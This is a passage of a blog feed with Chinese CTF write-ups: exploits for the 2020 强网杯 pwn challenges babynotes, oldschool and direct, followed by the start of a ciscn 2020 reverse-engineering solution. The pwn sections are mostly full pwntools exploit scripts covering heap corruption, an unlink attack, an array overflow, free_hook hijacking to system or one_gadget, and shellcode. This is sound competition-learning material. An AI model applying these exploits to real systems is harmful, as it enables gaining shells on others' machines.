</li><li>可以申请任意size的堆块，正负都行，但是有不同的攻击限制</li></ul><p>这题是可以满足的:</p><ul><li>利用strcpy来溢出age的数值 ，很简单的控制top chunk的 size</li><li>可以申请负的堆块，负的堆块可以打heap 或者 got ，获取一个任意地址写,<strong>通常应该都是打heap</strong></li></ul><h4 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>修改top chunk的size</li><li>利用house of  force，将top chunk向前移动，使得其与现有的chunk重合</li><li>然后通过malloc一个小堆块，构造好 fake chunk，控制现有堆的size和prev_size后_</li><li>做unlink，实现任意地址读写。</li></ul><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *sh = process(<span class="hljs-string">'./babynotes'</span>)<span class="hljs-comment"># sh = remote('123.56.170.202',43121)</span>elf = ELF(<span class="hljs-string">'./babynotes'</span>)libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)free_got = elf.got[<span class="hljs-string">'free'</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(sh)    pause()context.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>)sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(index,size)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendlineafter(<span class="hljs-string">'Input note size:'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(index)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(index,content)</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)   sh.sendlineafter(<span class="hljs-string">'Input index:'</span>,str(index))   sh.sendafter(<span class="hljs-string">'Input your note:'</span>,content)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reset</span><span class="hljs-params">()</span>:</span>   sh.sendlineafter(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'5'</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x100</span>)reset()sh.sendafter(<span class="hljs-string">'Input your name:'</span>,<span class="hljs-string">'haivk'</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">'a'</span>))sh.sendafter(<span class="hljs-string">'Input your motto:'</span>,<span class="hljs-string">'pwnit'</span>)sh.sendlineafter(<span class="hljs-string">'Input your age:'</span>,<span class="hljs-string">'-1'</span>)add(<span class="hljs-number">4</span>,<span class="hljs-number">-0x370</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x20</span>)<span class="hljs-comment">#top chunk上移</span>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0x110</span>))heap0_ptr_addr = <span class="hljs-number">0x6020E0</span>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x18</span>) + p64(heap0_ptr_addr - <span class="hljs-number">0x10</span>))debug()<span class="hljs-comment">#unlink</span>delete(<span class="hljs-number">1</span>)debug()edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(free_got))show(<span class="hljs-number">0</span>)sh.recvuntil(<span class="hljs-string">'Note 0: '</span>)free_addr = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))libc_base = free_addr - libc.sym[<span class="hljs-string">'free'</span>]system_addr = libc_base + libc.sym[<span class="hljs-string">'system'</span>]edit(<span class="hljs-number">0</span>,p64(system_addr))edit(<span class="hljs-number">2</span>,<span class="hljs-string">'/bin/sh\x00'</span>)<span class="hljs-comment">#getshell</span>delete(<span class="hljs-number">2</span>)sh.interactive()</code></pre></div><p>exp 来自 haivk 大师傅。</p><h2 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>给了源码，分析程序带来了很大的便利。<br>会发现很多地方对size大小验证不是很多，是负数也行，但是对此题的攻击，用途并不大。</p><div class="hljs"><pre><code class="hljs c">g_ptr =  mmap(ADDR_LOW + idx, ADDR_HIGH - ADDR_LOW - idx, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);</code></pre></div><p>这里可以看到申请的mmap区，是可以进行执行的，可以考虑一下shellcode。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">if</span>(g_ptr == <span class="hljs-literal">NULL</span>)&#123;        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Mmap first!"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-keyword">unsigned</span> value;    <span class="hljs-keyword">unsigned</span> idx;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Index: "</span>);    idx = get_int();         <span class="hljs-keyword">if</span>(g_ptr + idx &lt; g_ptr &amp;&amp; (<span class="hljs-keyword">unsigned</span>)(g_ptr + idx) &lt; ADDR_HIGH)&#123;        <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Invalid idx"</span>);        <span class="hljs-keyword">return</span>;    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Value: "</span>);    value = get_int();     g_ptr[idx] = value;&#125;</code></pre></div><p>可以看到其对<code>g_ptr + idx</code>的验证是很简单的，给足大的偏移，可以改到libc的。是一个数组溢出。</p><h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><h4 id="思路1"><a href="#思路1" class="headerlink" title="思路1:"></a>思路1:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>malloc_hook</code>，为mmap的地址。</li><li>在mmap的内存上填上shellcode</li></ul><h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2:"></a>思路2:</h4><ul><li>先正常分配，泄漏出libc地址</li><li>分配一下mmap，利用数组溢出，进行修改<code>free_hook</code>，为system。</li><li>free 一个 带有<code>/bin/sh</code>的chunk即可</li></ul><p>这个更好点。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_add</span><span class="hljs-params">(addr)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'6'</span>)    sla(<span class="hljs-string">'start'</span>,str(addr))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mmap_edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'7'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'lue'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">9</span>,<span class="hljs-number">0x10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">7</span>)add(<span class="hljs-number">10</span>,<span class="hljs-number">0x10</span>)show(<span class="hljs-number">10</span>)ru(<span class="hljs-string">'ent: '</span>)libc_base = uu32(r(<span class="hljs-number">4</span>)) - <span class="hljs-number">0x1d8828</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)system = <span class="hljs-number">0x3d200</span> + libc_basefree_hook = <span class="hljs-number">0x1d98d0</span> + libc_basemmap_add(<span class="hljs-number">0</span>)<span class="hljs-string">'''# one wayoffset = ((libc_base+0x1d8788 - 0xe0000000)) / 4mmap_edit(offset,'3758096384')shellcode = '\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80'shellcode = [int(0xd231c931),int(0x2f2f6852),int(0x2f686873),int(0x896e6962),int(0xb0c031e3),int(0x80cd0b)]for i in range(len(shellcode)):    mmap_edit(i,shellcode[i])add(13,0x10)'''</span><span class="hljs-comment"># two way</span>offset = ((free_hook - <span class="hljs-number">0xe0000000</span>)) / <span class="hljs-number">4</span>mmap_edit(offset,int(system))edit(<span class="hljs-number">9</span>,<span class="hljs-string">'/bin/sh\x00'</span> + <span class="hljs-string">'\n'</span>)free(<span class="hljs-number">9</span>)itr()</code></pre></div><h2 id="direct"><a href="#direct" class="headerlink" title="direct"></a>direct</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><h4 id="add函数"><a href="#add函数" class="headerlink" title="add函数"></a>add函数</h4><ul><li><p>申请的chunk最大值为0x100,max为16个</p></li><li><p>size可以为负值</p><h4 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h4></li><li><p>offset, size 都可以为负值</p></li><li><p><code>read(0, (void *)(heaplist[idx] + offset), nbytes);</code> 这里存在负溢出，可以修改上一个chunk里面的值</p></li></ul><h4 id="open-file函数"><a href="#open-file函数" class="headerlink" title="open file函数"></a>open file函数</h4><ul><li>只能调用一次，调用后可以进行edit chunk</li></ul><h4 id="close-函数"><a href="#close-函数" class="headerlink" title="close 函数"></a>close 函数</h4><div class="hljs"><pre><code class="hljs c">result = (<span class="hljs-keyword">ssize_t</span>)readdir(dirp);    v1 = result;    <span class="hljs-keyword">if</span> ( result )    &#123;      put(<span class="hljs-string">"Filename: "</span>);      result = put2(v1 + <span class="hljs-number">0x13</span>);</code></pre></div><p>进行打印文件名。</p><p>可以看到漏洞点就是在edit那里，且没有show函数。leak libc是此题的难点。因为是没有puts函数进行输出，所以攻击stdout也没有用。</p><p><strong>重点是了解opendir 和 readdir。</strong><br>参考链接：<br><a href="https://blog.csdn.net/cainiao000001/article/details/80988738" target="_blank" rel="noopener">https://blog.csdn.net/cainiao000001/article/details/80988738</a></p><p>可以发现，在调用opendir和readdir后，文件名是存在于内存中的。然后因为程序的写法，会直接输出一下<code>.</code>的文件名，再次调用会输出<code>..</code>的文件名，也是<code>0x13</code>的偏移处。那么想办法溢出修改这附近的内存，在打印文件名的时候，把libc地址也给印出来。</p><h3 id="攻击思路-4"><a href="#攻击思路-4" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>先申请8个堆，然后释放完，让其存在一个在unsortbin的chunk，且留出一个准备上溢出攻击的chunk</li><li>openfile一下，在heap上申请一个巨大的chunk</li><li>上溢出攻击，把加入unsortbin的chunk的size给修改大一点,覆盖到上面那个巨大的chunk，且这个巨大堆的next chunk的prev size 要填上合适的大小，绕过对unsortbin 的检查。</li><li>close一下，会在刚刚巨大的chunk中留下dirent结构体，其中会包含filename</li><li>申请堆到<code>..</code>这个文件名的附近，因为是unsortbin，会在其下面留下libc地址，准备泄漏（这个要注意，尽量不要破坏dirent结构体的数据，破坏后容易无法输出filename）</li><li>上溢攻击<code>..</code>的文件名，给其修改其他合适的名字，泄漏出libc地址</li><li>剩下的就简单了，上溢攻击tcache chain，修改为free hook</li><li>攻击free hook 为one gadget</li></ul><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize'</span>,str(size))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,offset,size,data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'set'</span>,str(offset))    sla(<span class="hljs-string">'ize'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">openfile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'4'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">closefile</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'5'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">8</span>,<span class="hljs-number">0x18</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)openfile()add(<span class="hljs-number">9</span>,<span class="hljs-number">0x18</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>)free(<span class="hljs-number">7</span>)data = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x8040</span> + <span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>)edit(<span class="hljs-number">8</span>,<span class="hljs-number">-0x120</span>,<span class="hljs-number">0x100</span>,data)data = p64(<span class="hljs-number">0x8170</span>) + p64(<span class="hljs-number">0x20</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x30</span>,<span class="hljs-number">0x18</span>,data)closefile()add(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x70</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)data = p64(<span class="hljs-number">0x121111111111</span>)[:<span class="hljs-number">6</span>]print(data)edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)closefile()ru(<span class="hljs-string">'\x12'</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3ebca0</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)data = p64(<span class="hljs-number">0x000000000000</span>)[:<span class="hljs-number">6</span>]edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x7fd8</span><span class="hljs-number">-0x30</span>+<span class="hljs-number">2</span>,<span class="hljs-number">0x8</span>,data)free_hook = <span class="hljs-number">0x3ed8e8</span> + libc_baseone = <span class="hljs-number">0x4f322</span> + libc_basedata = <span class="hljs-string">'1'</span> * <span class="hljs-number">8</span>edit(<span class="hljs-number">0</span>,<span class="hljs-number">-0x82a0</span>,<span class="hljs-number">8</span>,p64(free_hook))add(<span class="hljs-number">4</span>,<span class="hljs-number">0x100</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">0x100</span>)edit(<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(one))free(<span class="hljs-number">4</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;强网杯2020-部分题目&quot;&gt;&lt;a href=&quot;#强网杯2020-部分题目&quot; class=&quot;headerlink&quot; title=&quot;强网杯2020 部分题目&quot;&gt;&lt;/a&gt;强网杯2020 部分题目&lt;/h1&gt;&lt;h2 id=&quot;babymessage&quot;&gt;&lt;a href=&quot;#ba
      
    
    </summary>
    
    
      <category term="re" scheme="http://chumen77.xyz/tags/re/"/>
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ciscn 2020初赛部分题目</title>
    <link href="http://chumen77.xyz/2020/08/20/ciscn%202020%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <id>http://chumen77.xyz/2020/08/20/ciscn 2020初赛部分题目/</id>
    <published>2020-08-20T15:03:02.238Z</published>
    <updated>2020-09-24T02:19:08.778Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ciscn-2020初赛部分题目"><a href="#ciscn-2020初赛部分题目" class="headerlink" title="ciscn  2020初赛部分题目"></a>ciscn  2020初赛部分题目</h1><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="z3"><a href="#z3" class="headerlink" title="z3"></a>z3</h3><p>￼<br>看起来像是非齐次线性方程，那就是就是一个解方程:</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> numpy <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> npa = np.array([[<span class="hljs-number">12</span>, <span class="hljs-number">53</span>, <span class="hljs-number">6</span>,<span class="hljs-number">34</span>,<span class="hljs-number">58</span>,<span class="hljs-number">36</span>,<span class="hljs-number">1</span>],            [<span class="hljs-number">83</span>,<span class="hljs-number">85</span>,<span class="hljs-number">12</span>,<span class="hljs-number">73</span>,<span class="hljs-number">27</span>,<span class="hljs-number">96</span>,<span class="hljs-number">52</span>],            [<span class="hljs-number">78</span>,<span class="hljs-number">53</span>,<span class="hljs-number">24</span>,<span class="hljs-number">36</span>,<span class="hljs-number">86</span>,<span class="hljs-number">25</span>,<span class="hljs-number">46</span>],            [<span class="hljs-number">39</span>,<span class="hljs-number">78</span>,<span class="hljs-number">52</span>,<span class="hljs-number">9</span>,<span class="hljs-number">62</span>,<span class="hljs-number">37</span>,<span class="hljs-number">84</span>],            [<span class="hljs-number">23</span>,<span class="hljs-number">6</span>,<span class="hljs-number">14</span>,<span class="hljs-number">74</span>,<span class="hljs-number">48</span>,<span class="hljs-number">12</span>,<span class="hljs-number">83</span>],            [<span class="hljs-number">27</span>,<span class="hljs-number">85</span>,<span class="hljs-number">92</span>,<span class="hljs-number">42</span>,<span class="hljs-number">48</span>,<span class="hljs-number">15</span>,<span class="hljs-number">72</span>],            [<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">67</span>,<span class="hljs-number">0</span>,<span class="hljs-number">26</span>,<span class="hljs-number">68</span>]])b = np.array([[<span class="hljs-number">20247</span>],[<span class="hljs-number">40182</span>],[<span class="hljs-number">36315</span>],[<span class="hljs-number">36518</span>],[<span class="hljs-number">26921</span>],[<span class="hljs-number">39185</span>],[<span class="hljs-number">16546</span>]])result=[]x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12094</span>],[<span class="hljs-number">25270</span>],[<span class="hljs-number">19330</span>],[<span class="hljs-number">18540</span>],[<span class="hljs-number">16386</span>],[<span class="hljs-number">21207</span>],[<span class="hljs-number">11759</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10460</span>],[<span class="hljs-number">25613</span>],[<span class="hljs-number">21135</span>],[<span class="hljs-number">24891</span>],[<span class="hljs-number">18305</span>],[<span class="hljs-number">27415</span>],[<span class="hljs-number">12855</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">10899</span>],[<span class="hljs-number">24927</span>],[<span class="hljs-number">20670</span>],[<span class="hljs-number">22926</span>],[<span class="hljs-number">18006</span>],[<span class="hljs-number">23345</span>],[<span class="hljs-number">12602</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">12304</span>],[<span class="hljs-number">26622</span>],[<span class="hljs-number">19807</span>],[<span class="hljs-number">22747</span>],[<span class="hljs-number">14233</span>],[<span class="hljs-number">24736</span>],[<span class="hljs-number">10064</span>]])x = np.linalg.solve(a, b)result += x.tolist()b = np.array([[<span class="hljs-number">14169</span>],[<span class="hljs-number">35155</span>],[<span class="hljs-number">28962</span>],[<span class="hljs-number">33273</span>],[<span class="hljs-number">21796</span>],[<span class="hljs-number">35185</span>],[<span class="hljs-number">14877</span>]])x = np.linalg.solve(a, b)result += x.tolist()flag=<span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:    <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> i:        flag+=chr(int(f+<span class="hljs-number">0.5</span>))print(flag)</code></pre></div><h3 id="hyperthreading"><a href="#hyperthreading" class="headerlink" title="hyperthreading"></a>hyperthreading</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>主程序很简单，要求输入42位的flag。</p><div class="hljs"><pre><code class="hljs undefined">Handles = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, StartAddress, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);v5 = CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, loc_401200, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)sub_401240, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);WaitForMultipleObjects(<span class="hljs-number">2</span>u, &amp;Handles, <span class="hljs-number">1</span>, <span class="hljs-number">0xFFFFFFFF</span>);</code></pre></div><p>这里开始开多线程。</p><div class="hljs"><pre><code class="hljs undefined">void __stdcall __noreturn sub_401240(LPVOID lpThreadParameter)&#123;  <span class="hljs-keyword">while</span> ( !IsDebuggerPresent() )    ;  puts((int)<span class="hljs-string">"debug!\n"</span>);  <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>这里面分别有一个反调试。用的IsDebuggerPresent。<br>￼￼￼￼￼￼￼￼<br>还有对你输入的东西进行处理，处理完以后与</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">402150</span> key             db <span class="hljs-number">0</span>DDh,<span class="hljs-number">5</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">1</span>Dh,<span class="hljs-number">20</span>h,<span class="hljs-number">9</span>Eh,<span class="hljs-number">90</span>h,<span class="hljs-number">91</span>h,<span class="hljs-number">2</span> dup(<span class="hljs-number">90</span>h),<span class="hljs-number">91</span>h.rdata:<span class="hljs-number">00402150</span>                                         ; DATA XREF: main1+<span class="hljs-number">96</span>↑r.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">92</span>h,<span class="hljs-number">0</span>DEh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">11</span>h,<span class="hljs-number">0</span>D1h,<span class="hljs-number">1</span>Eh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">8</span>Bh,<span class="hljs-number">51</span>h,<span class="hljs-number">11</span>h.rdata:<span class="hljs-number">00402150</span>                 db <span class="hljs-number">50</span>h,<span class="hljs-number">51</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">9</span>Eh,<span class="hljs-number">2</span> dup(<span class="hljs-number">5</span>Dh),<span class="hljs-number">11</span>h,<span class="hljs-number">8</span>Bh,<span class="hljs-number">90</span>h,<span 